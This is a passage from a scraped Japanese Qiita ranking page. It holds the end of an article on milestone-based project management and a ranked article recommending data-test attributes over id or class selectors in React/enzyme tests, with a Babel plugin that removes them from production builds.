<span id="中長期管理" class="fragment"></span><a href="#%E4%B8%AD%E9%95%B7%E6%9C%9F%E7%AE%A1%E7%90%86"><i class="fa fa-link"></i></a>中長期管理</h3>

<ul>
<li>案件成功までの段取り、全体状況の俯瞰が関心事</li>
<li>粒度は中〜大</li>
<li>変更量が少ない</li>
<li>外部ステークスホルダ向け（上司や顧客）　※ただし、内部メンバーも閲覧するよ！</li>
<li>フォーマルに回す必要がある</li>
<li>マネージャがオーナー</li>
<li>棚卸はウィークリーミーティングベース（隔週のパターンもあるよ！）</li>
</ul>

<p>責務の違いは色々あれど、特に大きな違いとして<strong>中長期管理は部外者とのスムーズな情報共有が解決すべき課題として含まれる。</strong>現場からすれば他愛もない課題に部外者が「どうなってるんだ」「大丈夫なのか」「ええい俺が陣頭指揮してやる！」と出しゃばって問題がよりややこしくなった経験、あるでしょう？？？<br>
このような責務の違いは単一の管理手法では吸収が難しい。そこで、私が管理する案件では以下の手順で中長期計画を管理している。</p>

<h2>
<span id="1-マイルストーンを洗い出す" class="fragment"></span><a href="#1-%E3%83%9E%E3%82%A4%E3%83%AB%E3%82%B9%E3%83%88%E3%83%BC%E3%83%B3%E3%82%92%E6%B4%97%E3%81%84%E5%87%BA%E3%81%99"><i class="fa fa-link"></i></a>1. マイルストーンを洗い出す</h2>

<p><a href="http://qiita.com/0w0/items/0b287be30af6539ac5e9">前記事</a>では「アンチパターン」として記述した「○○の基本設計」「○○の要件定義」等の抽象度が強い作業を洗い出し、WBS等に書き出す。体裁は予定と実績が管理できれば何でもよし。粒度は4〜5営業日が手頃だが、大きさよりも適切にカテゴライズされていることの方が大事。ぶっちゃけ粒度がもっと大きくてもたぶん回るが、部外者から「粗い」と文句を言われるリスクが高まるのでオススメしない。</p>

<p>ポイントは、前記事タスクより粒度を1〜2回り大きくすることと、「外部から見た関心事」と一致しさせること。将来発生するであろう小タスク群を包み込む、抽象化された作業をイメージすると良い感じに作れる。</p>

<p>なお、ここで洗い出したタスクはできるだけ「マイルストーン」と呼ぶことにしている。これは後述するマイルストーンの品出しにおいて「内部的なプロセスに対して裁量を与えられているイメージを持って欲しい」という思いがあるから。ただし語彙の選択にはこだわりを持つ人もいるので、コンクリフトしそうなら使用を避ける。</p>

<h3>
<span id="前記事を読んだ人への補足" class="fragment"></span><a href="#%E5%89%8D%E8%A8%98%E4%BA%8B%E3%82%92%E8%AA%AD%E3%82%93%E3%81%A0%E4%BA%BA%E3%81%B8%E3%81%AE%E8%A3%9C%E8%B6%B3"><i class="fa fa-link"></i></a>※<a href="http://qiita.com/0w0/items/0b287be30af6539ac5e9">前記事</a>を読んだ人への補足</h3>

<p>前記事で「抽象化された重いタスクは切らない」と書いてしまったがために「中規模の管理は一切不要」と多くの人に勘違いさせてしまったのだが、要するに「メンバー個人には具体的な作業単位で物事を考えるようにさせた」と言う話で、抽象化されたレベルの進捗は今でもマネージャが管理している。（混乱させて正直すまんかった…）<br>
ちなみに、前記事における「改善前のタスク管理」は「WBSの予定日が来ると作業詳細を詳しく書いた同粒度のタスクチケットが発行される」というイメージで、それより小さな管理単位はない状況だった。今思えば完全な二重管理である。</p>

<p>なお、「改善前と同じ粒度の管理対象が存在しているなら、細かい管理を付け加えた分トータルの工数が増えるのでは？」と思われる方もいるかも知れないが、低位タスクの管理が適切に回ると中長期レベルの進捗課題が自然と減るので問題ない。逆に言えば低位の管理をパーフェクトに回せているなら前記事の対応は不要。とはいえ、上流が得意な企業ですら上手にマネジメントできているパターンはあまり見たことがない…。</p>

<h2>
<span id="2-デイリーミーティング等でマイルストーンを品出しする" class="fragment"></span><a href="#2-%E3%83%87%E3%82%A4%E3%83%AA%E3%83%BC%E3%83%9F%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E7%AD%89%E3%81%A7%E3%83%9E%E3%82%A4%E3%83%AB%E3%82%B9%E3%83%88%E3%83%BC%E3%83%B3%E3%82%92%E5%93%81%E5%87%BA%E3%81%97%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>2. デイリーミーティング等でマイルストーンを品出しする</h2>

<p>このタイミングで作ったマイルストーンをメンバー個人にアサインしていく。<br>
この際に各個人はマイルストーンに応じてタスクを作成するのだが、<a href="http://qiita.com/0w0/items/0b287be30af6539ac5e9">前記事</a>の通り<strong>直前作業のみをタスクとして登録して貰い、抽象的な切り方をさせない。</strong><br>
例えば、「君は○○機能の要件定義を担当して欲しい。来週の火曜が期日だから、とりあえず『打ち合わせの計画を段取る』というタスクをツールに追加してみようか」とか振ってみる。マイルストーンの達成を目標に小さなタスク作成を任せていくイメージ。<br>
後は前記事で説明したタスク運用の流れに乗せつつ、デイリーミーティングで様子を見守る。</p>

<h3>
<span id="メンバーが上手にタスクを切れず困っているなら" class="fragment"></span><a href="#%E3%83%A1%E3%83%B3%E3%83%90%E3%83%BC%E3%81%8C%E4%B8%8A%E6%89%8B%E3%81%AB%E3%82%BF%E3%82%B9%E3%82%AF%E3%82%92%E5%88%87%E3%82%8C%E3%81%9A%E5%9B%B0%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AA%E3%82%89"><i class="fa fa-link"></i></a>メンバーが上手にタスクを切れず、困っているなら…</h3>

<p>マネージャが介入し、五十六メソッドを適用しつつタスクを切る。（いわゆる「やってみせ」「させてみせ」の部分）<br>
マイルストーン内の自己管理ができるレベルまでは教育を密に実施する。一方で「チケット管理するマン」にはならないような距離感を意識する。</p>

<h3>
<span id="介入せずとも自律的にタスク管理できているなら" class="fragment"></span><a href="#%E4%BB%8B%E5%85%A5%E3%81%9B%E3%81%9A%E3%81%A8%E3%82%82%E8%87%AA%E5%BE%8B%E7%9A%84%E3%81%AB%E3%82%BF%E3%82%B9%E3%82%AF%E7%AE%A1%E7%90%86%E3%81%A7%E3%81%8D%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AA%E3%82%89"><i class="fa fa-link"></i></a>介入せずとも自律的にタスク管理できているなら…</h3>

<p>「より作業者に近い立場の意見が欲しい」として、メンバーにマイルストーン自体の管理プロセスを部分的に任せつつ、リーダーやマネージャーへのクラスチェンジを考える。この辺りは当人の希望と会社の都合次第だが、できる限り良い方向に働くように管理側で取りはからうこと。</p>

<p>いずれのケースにしても、メンバーに個人裁量で管理できる領域を与えつつ、少しずつ広げられるよう支援する。ただし、中には「別にチームの管理なんてやりたくないし」というメンバーもいるので、そこは当人の意思も加味する。</p>

<p>特に、プレイングマネージャにだけはならないように心掛ける。もうチケット管理マンはいやなんだ…</p>

<h2>
<span id="3-週次あるいは隔週ベースで状況を上長や顧客に共有する" class="fragment"></span><a href="#3-%E9%80%B1%E6%AC%A1%E3%81%82%E3%82%8B%E3%81%84%E3%81%AF%E9%9A%94%E9%80%B1%E3%83%99%E3%83%BC%E3%82%B9%E3%81%A7%E7%8A%B6%E6%B3%81%E3%82%92%E4%B8%8A%E9%95%B7%E3%82%84%E9%A1%A7%E5%AE%A2%E3%81%AB%E5%85%B1%E6%9C%89%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>3. 週次（あるいは隔週）ベースで状況を上長や顧客に共有する</h2>

<p>マイルストーン状況を外部のステークスホルダーに共有する。案件そのものの風向きを変える出来事があればここで拾って中長期プランに反映させていく。<br>
なお、共有内容は前述の通り「外部から見た関心事（＝彼らの職務領域と関わる事柄）」を意識する。現場ベースの些末はここでフィルタリングし、重要な意思決定に関わる議論を阻害しないように。<br>
ただし、単なる不都合の隠蔽はより状況をややこしくするだけなのでやめること。あくまでノイズをカットする程度のイメージで！</p>

<h2>
<span id="おしまい" class="fragment"></span><a href="#%E3%81%8A%E3%81%97%E3%81%BE%E3%81%84"><i class="fa fa-link"></i></a>おしまい！</h2>

<p>後は1〜3をぐるぐる回すだけ。ちなみに半年〜1年くらいの長期計画は適当にExcelでお絵描きして共有してるよ！それを踏まえたガチな長期管理はボスの仕事さ！ヒュウ！（タイトルに合わせただけの雑な追記）</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">62位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>165</kbd>
		<a target="_blank" href="https://qiita.com/akameco/items/519f7e4d5442b2a9d2da">idやclassを使ってテストを書くのは、もはやアンチパターンである</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-19<br />03:46:34</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/15319.html">akameco</a>(135件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/15319/profile-images/1473684249">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[test]</b> <b>[e2e]</b> <b>[jest]</b> <b>[React]</b> <b>[enzyme]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><strong>いきなり結論を書くと、<code>id</code>や<code>class</code>はスタイルのためのものなので、テストでそれを使うのはやめましょう。そして、カスタムデータ属性を使いましょう。</strong>(<code>id</code>や<code>class</code>はスタイルのためだけではないという意見はごもっともです！しかし、主にとしてスタイルに使われるということでご了承頂いて以下の駄文に付き合って頂けると幸いです🙇)</p>

<p>先に断っておくと主にreactについての話で、JSXを前提とします。(手法はReactに限りませんが理由は後述)</p>

<h2>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h2>

<p>ご存知の通り、ロジックとスタイルは別物です。<br>
もしスタイルの変更のためにclass名を変えて、ロジックのテストが落ちるなんてことはあってはならないのです。</p>

<blockquote>
<p>cssに手を入れたいのだけど、このクラス名は変えていいのか？取り除いていいのか？あれ？スタイルの変更のためにクラス名を変更したらテストが落ちた。テストで取得するクラス名を変えなくては！</p>
</blockquote>

<p>全く、これは最悪な状況です。同じクラス名をスタイルでもテストでも使ってしまっているパターンです。ロジックとスタイルが完全に密結合になっています。あまりに、あまりに、脆い。脆弱なテストであります。</p>

<p>さて、問題を共有したところで、実例を踏まえて、これを解決する方法を検討していきましょう。</p>

<h2>
<span id="修正困難なクラス名" class="fragment"></span><a href="#%E4%BF%AE%E6%AD%A3%E5%9B%B0%E9%9B%A3%E3%81%AA%E3%82%AF%E3%83%A9%E3%82%B9%E5%90%8D"><i class="fa fa-link"></i></a>修正困難なクラス名</h2>

<p>以下のようなフォームがあるとしましょう(なお、ニュアンスだけ伝わればいいので、以下のコードそのままでは動作しません)</p>

<p><a href="https://camo.qiitausercontent.com/8ad5508e977f754ffe3808046ad933f78f848903/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f61613833653336372d303166622d343134392d333336632d3238366266323534663664642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8ad5508e977f754ffe3808046ad933f78f848903/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f61613833653336372d303166622d343134392d333336632d3238366266323534663664642e706e67" alt="スクリーンショット 2017-11-19 02.20.07.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15319/aa83e367-01fb-4149-336c-286bf254f6dd.png"></a></p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">Form</span> <span class="o">=</span> <span class="p">(</span>
    <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">onSubmit</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">handleSubmit</span><span class="p">}</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"field"</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"control"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"input email-field"</span> <span class="nx">placeholder</span><span class="o">=</span><span class="s2">"Email"</span> <span class="o">/&gt;</span>
      <span class="o">&lt;</span><span class="err">/div&gt;</span>
    <span class="o">&lt;</span><span class="err">/div&gt;</span>

    <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"field"</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"control"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">input</span>
          <span class="nx">type</span><span class="o">=</span><span class="s2">"password"</span>
          <span class="nx">className</span><span class="o">=</span><span class="s2">"input password-field"</span>
          <span class="nx">placeholder</span><span class="o">=</span><span class="s2">"Password"</span>
        <span class="o">/&gt;</span>
      <span class="o">&lt;</span><span class="err">/div&gt;</span>
    <span class="o">&lt;</span><span class="err">/div&gt;</span>

    <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"field is-grouped"</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"control"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"button is-primary"</span><span class="o">&gt;</span>
          <span class="nx">Sign</span> <span class="k">in</span>
        <span class="o">&lt;</span><span class="err">/button&gt;</span>
      <span class="o">&lt;</span><span class="err">/p&gt;</span>
    <span class="o">&lt;</span><span class="err">/div&gt;</span>
  <span class="o">&lt;</span><span class="err">/form&gt;</span>
<span class="p">)</span>
</pre></div></div>

<p>enzymeでテストするには以下のように<code>find</code>を使って要素を特定していきます。ここでは、クラス名を用いて要素を特定します。<br>
この時点では、問題はありません。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">import</span> <span class="p">{</span> <span class="nx">mount</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'enzyme'</span>

<span class="nx">test</span><span class="p">(</span><span class="s1">'Sign in'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kr">const</span> <span class="nx">wrapper</span> <span class="o">=</span> <span class="nx">mount</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">Login</span> <span class="o">/&gt;</span><span class="p">)</span>
  <span class="kr">const</span> <span class="nx">emailField</span> <span class="o">=</span> <span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="s1">'.email-field'</span><span class="p">)</span>
  <span class="kr">const</span> <span class="nx">passwordField</span> <span class="o">=</span> <span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="s1">'.password-field'</span><span class="p">)</span>
  <span class="kr">const</span> <span class="nx">submit</span> <span class="o">=</span> <span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="s1">'.button'</span><span class="p">)</span>

    <span class="c1">// ...</span>
<span class="p">})</span>
</pre></div></div>

<p>さて、ここで、新しく<code>Sign Up</code>ボタンを追加したいとしましょう。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span>      <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"control"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"button is-primary"</span><span class="o">&gt;</span>
          <span class="nx">Sign</span> <span class="nx">Up</span>
        <span class="o">&lt;</span><span class="err">/button&gt;</span>
      <span class="o">&lt;</span><span class="err">/p&gt;</span>

      <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"control"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"button"</span><span class="o">&gt;</span>
          <span class="nx">Sign</span> <span class="k">in</span>
        <span class="o">&lt;</span><span class="err">/button&gt;</span>
      <span class="o">&lt;</span><span class="err">/p&gt;</span>
</pre></div></div>

<p><strong>only meant to be run on a single node. 2 found instead.</strong><br>
<code>.button</code>が2つになりNodeを特定できず、テストが落ちました。</p>

<p>では、以下のように順番に要素を取得しますか？</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span>  <span class="kr">const</span> <span class="nx">signIn</span> <span class="o">=</span> <span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="s1">'.button'</span><span class="p">).</span><span class="nx">at</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
  <span class="kr">const</span> <span class="nx">signUp</span> <span class="o">=</span> <span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="s1">'.button'</span><span class="p">).</span><span class="nx">at</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></div></div>

<p>まさかです。ちなみにすでにバグがあります。signInとsignUpが逆です。ここで、<strong>テストのために</strong>classNameに<code>sign-btn</code>でも加えますか？ですが、それに対してスタイルが当たってしまったらもうがんじがらめです。cssやクラス名を容易に変更することは出来なくなりました。新しいCSSのアーキテクチャを導入することもスタイルとテストが密結合なので難しく、そして<code>CSS in JS</code>に移行したくとも、スタイルのためのclassNameがどれで、テストのためのclassNameがどれか判断するのは困難です。</p>

<p>この問題は、<strong>ソースコードとテストの関係があまりに暗黙的に過ぎる</strong>のです。<br>
この<strong>関係を明快にする</strong>ことで、問題を解決しましょう。</p>

<h2>
<span id="data-test属性" class="fragment"></span><a href="#data-test%E5%B1%9E%E6%80%A7"><i class="fa fa-link"></i></a>data-test属性</h2>

<p>カスタムデータ属性を使います。<br>
これによって、何をテストすべきかが明確になります。</p>

<div class="code-frame" data-lang="diff"><div class="highlight"><pre><span></span>  &lt;form onSubmit={this.handleSubmit}&gt;
    &lt;div className="field"&gt;
      &lt;div className="control"&gt;
        &lt;input
<span class="gi">+         data-test="email"</span>
          type="text"
          className="input"
          placeholder="Email"
        /&gt;
      &lt;/div&gt;
    &lt;/div&gt;

    &lt;div className="field"&gt;
      &lt;div className="control"&gt;
        &lt;input
<span class="gi">+         data-test="password"</span>
          type="password"
          className="input"
          placeholder="Password"
        /&gt;
      &lt;/div&gt;
    &lt;/div&gt;

    &lt;div className="field is-grouped"&gt;
      &lt;p className="control"&gt;
<span class="gi">+        &lt;button type="submit" className="button" data-test="sign-in"&gt;</span>
          Sign in
        &lt;/button&gt;
      &lt;/p&gt;

      &lt;p className="control"&gt;
<span class="gi">+        &lt;button type="submit" className="button is-primary" data-test="sign-up"&gt;</span>
          Sign Up
        &lt;/button&gt;
      &lt;/p&gt;
    &lt;/div&gt;
  &lt;/form&gt;
</pre></div></div>

<p>どうテストを書けばいいのかが非常にスッキリします。<br>
また、<code>sel</code>というユーティリティ関数を用意しましょう。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">sel</span> <span class="o">=</span> <span class="nx">id</span> <span class="o">=&gt;</span> <span class="sb">`[data-test="</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">"]`</span>


<span class="kr">const</span> <span class="nx">emailField</span> <span class="o">=</span> <span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">sel</span><span class="p">(</span><span class="s1">'email'</span><span class="p">))</span>
<span class="kr">const</span> <span class="nx">passwordField</span> <span class="o">=</span> <span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">sel</span><span class="p">(</span><span class="s1">'password'</span><span class="p">))</span>
<span class="kr">const</span> <span class="nx">signIn</span> <span class="o">=</span> <span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">sel</span><span class="p">(</span><span class="s1">'sign-in'</span><span class="p">))</span>
<span class="kr">const</span> <span class="nx">signUp</span> <span class="o">=</span> <span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">sel</span><span class="p">(</span><span class="s1">'sign-up'</span><span class="p">))</span>
</pre></div></div>

<p>🎉🎉🎉</p>

<p><code>data-test</code>というテストのための属性を使うことで、<strong>何をテストするのか非常に明確</strong>になりました。<br>
そして、テストからクラスを扱わないことで、自由にスタイルのためにクラス名を変更したり、また、いつでも<code>CSS in JS</code>に切り替えられます。</p>

<p>ここではclassで取得して、ここではタグで取得して、ここではidで、ここでは...ここでは...ここでは......うんざりです。全くもってうんざりなのです。人により違う書き方。複数のやり方があるというのは。h2をh3と変えるだけで意味もなく落ちるロジックのテスト。そんなテストは開発の邪魔でしかありません。(また、h2とh3に変えたときに落としたいなら、スナップショットテストを利用すべき状況です。クラス名同様タグに依存すべきではありません)</p>

<p>しかし、それは過去の話です。<strong>テストのためのカスタムデータ属性を使う</strong>ことで、綺麗に分離ができます。(なお、htmlの機能の一つでしかないので、上記のようなコンポーネント単位でもE2Eテストでも有効な手法です)</p>

<h2>
<span id="プロダクションビルドではカスタムデータ属性を取り除く" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%83%80%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%93%E3%83%AB%E3%83%89%E3%81%A7%E3%81%AF%E3%82%AB%E3%82%B9%E3%82%BF%E3%83%A0%E3%83%87%E3%83%BC%E3%82%BF%E5%B1%9E%E6%80%A7%E3%82%92%E5%8F%96%E3%82%8A%E9%99%A4%E3%81%8F"><i class="fa fa-link"></i></a>プロダクションビルドではカスタムデータ属性を取り除く</h2>

<p>プロダクションに<code>data-test</code>の属性は残す必要はありません。(まあ残しても問題はないですが)<br>
御存知の通り、<strong>JSXはhtmlではなく、JavaScriptのシンタックスの一つに過ぎません。</strong>(<em>要らぬツッコミを避けるために言及するとBabel環境を前提とします。ですので何がJavaScriptだとかの議論は不要でありますので別の場所でやって頂けると嬉しいです</em>)<br>
つまり、ASTの操作でいくらでも消すことが可能です。<br>
具体的には、以下のプラグインをproductionビルドで有効にすれば跡形もなく消えます。</p>

<p><a href="https://github.com/oliviertassinari/babel-plugin-react-remove-properties" rel="nofollow noopener" target="_blank"><strong>babel-plugin-react-remove-properties</strong></a></p>

<div class="code-frame" data-lang="babelrc"><div class="highlight"><pre><span></span>{
  "env": {
    "production": {
      "plugins": ["react-remove-properties"]
    }
  }
}
</pre></div></div>

<p>In:</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">class</span> <span class="nx">Foo</span> <span class="kr">extends</span> <span class="nx">React</span><span class="p">.</span><span class="nx">Component</span> <span class="p">{</span>
  <span class="nx">render</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span>
      <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"bar"</span> <span class="nx">data</span><span class="o">-</span><span class="nx">test</span><span class="o">=</span><span class="s2">"thisIsASelectorForSelenium"</span><span class="o">&gt;</span>
        <span class="nx">Hello</span> <span class="nx">Wold</span><span class="o">!</span>
      <span class="o">&lt;</span><span class="err">/div&gt;</span>
    <span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>Out:</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">class</span> <span class="nx">Foo</span> <span class="kr">extends</span> <span class="nx">React</span><span class="p">.</span><span class="nx">Component</span> <span class="p">{</span>
  <span class="nx">render</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span>
      <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"bar"</span><span class="o">&gt;</span>
        <span class="nx">Hello</span> <span class="nx">Wold</span><span class="o">!</span>
      <span class="o">&lt;</span><span class="err">/div&gt;</span>
    <span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="誰が使っているか" class="fragment"></span><a href="#%E8%AA%B0%E3%81%8C%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B%E3%81%8B"><i class="fa fa-link"></i></a>誰が使っているか？</h2>

<p>この方法を推奨しているのがpaypalのエンジニアであり、tc39のメンバーでもあるkentcdaddsです。<br>
最も勢いのあるCSSinJSのライブラリの一つである<a href="https://github.com/paypal/glamorous" rel="nofollow noopener" target="_blank">glamorous</a>の作者でもあります。glamorousはstorybookの内部でも使われているので、知らずのうちにあなたのプロジェクトの依存にいるかも知れません。</p>

<p>なぜidを使わないか、listなどの複数要素はどうするか等含め、以下の記事に詳しくまとまっています。</p>

<p><a href="https://blog.kentcdodds.com/making-your-ui-tests-resilient-to-change-d37a6ee37269" rel="nofollow noopener" target="_blank">Making your UI tests resilient to change – kentcdodds</a></p>

<p>ちなみに<code>data-test</code>属性を取り除くプラグインの作者は、material-uiの作者のoliviertassinariです。</p>

<h2>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h2>

<p><code>data-test</code>属性を使うことで、reactにおけるテストの見通しを上げる方法を紹介しました。<br>
テストを書くのは当然として、メンテしやすく、よりよいテストを書いていきましょう。</p>

<p>もっといい方法やうちではこう書いてる等、何かあればコメント欄、twitterで是非議論しましょう。<br>
また、Reactのテストのベストプラクティスについて何かよい考えがあれば教えて頂けるとうれしいです。</p>

<blockquote class="twitter-tweet">
<p>mountを使ったらそれはインテグレーションテストという認識。とゆうか、テストのベストプラクティスが知りたい <a href="https://t.co/1iPNE06rkb" rel="nofollow noopener" target="_blank">pic.twitter.com/1iPNE06rkb</a></p>— あかめ@無職.js (@akameco) <a href="https://twitter.com/akameco/status/931860728088104960?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">November 18, 2017</a>
</blockquote>



<h2>
<span id="参考" class="fragment"></span><a href="#%E5%8F%82%E8%80%83"><i class="fa fa-link"></i></a>参考</h2>

<p><a href="https://blog.kentcdodds.com/making-your-ui-tests-resilient-to-change-d37a6ee37269" rel="nofollow noopener" target="_blank">Making your UI tests resilient to change – kentcdodds</a></p>

<h2>
<span id="ツイッターやはてブのコメントの反映" class="fragment"></span><a href="#%E3%83%84%E3%82%A4%E3%83%83%E3%82%BF%E3%83%BC%E3%82%84%E3%81%AF%E3%81%A6%E3%83%96%E3%81%AE%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88%E3%81%AE%E5%8F%8D%E6%98%A0"><i class="fa fa-link"></i></a>ツイッターやはてブのコメントの反映</h2>

<p>ツイッターやはてブの意見を反映してより中身のある記事にしたいので反応を見かけ次第記事に反映していきます。</p>

<h3>
<span id="-こういう動機に至らせてしまうreactがそもそも開発プラットフォームとしては微妙な気がしている" class="fragment"></span><a href="#-%E3%81%93%E3%81%86%E3%81%84%E3%81%86%E5%8B%95%E6%A9%9F%E3%81%AB%E8%87%B3%E3%82%89%E3%81%9B%E3%81%A6%E3%81%97%E3%81%BE%E3%81%86react%E3%81%8C%E3%81%9D%E3%82%82%E3%81%9D%E3%82%82%E9%96%8B%E7%99%BA%E3%83%97%E3%83%A9%E3%83%83%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%81%A8%E3%81%97%E3%81%A6%E3%81%AF%E5%BE%AE%E5%A6%99%E3%81%AA%E6%B0%97%E3%81%8C%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a>🤔 こういう動機に至らせてしまうReactがそもそも開発プラットフォームとしては微妙な気がしている</h3>

<p>いいえ。それは誤解です。この問題はReactに限りません。どのようなフロントエンド環境でも同じ問題は起こります。むしろ、JSXによる属性の削除が簡単な分、利点と言えるでしょう。</p>

<h3>
<span id="-idやclassはスタイルのためだけではない" class="fragment"></span><a href="#-id%E3%82%84class%E3%81%AF%E3%82%B9%E3%82%BF%E3%82%A4%E3%83%AB%E3%81%AE%E3%81%9F%E3%82%81%E3%81%A0%E3%81%91%E3%81%A7%E3%81%AF%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>🤔 idやclassはスタイルのためだけではない</h3>

<blockquote class="twitter-tweet">
<p>HTMLのidもclassもある文書の中で固有の物、既存の要素とは別の分類でmarkupをしたい時に使うものでCSSでもそれらがセレクタに使用できるというだけである。文書全体の趣旨には全く文句はないが、idやclassはスタイルのためだけの物ではない</p>— KIMATA RobertHisasi (@robert_KIMATA) <a href="https://twitter.com/robert_KIMATA/status/932175540403843072?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">2017年11月19日</a>
</blockquote>



<p>全く仰るとおりです。ですが、そこまで言及すると、無駄に説明が伸びてしまうので、この引用をもって、代わりとさせてください。</p>

<h3>
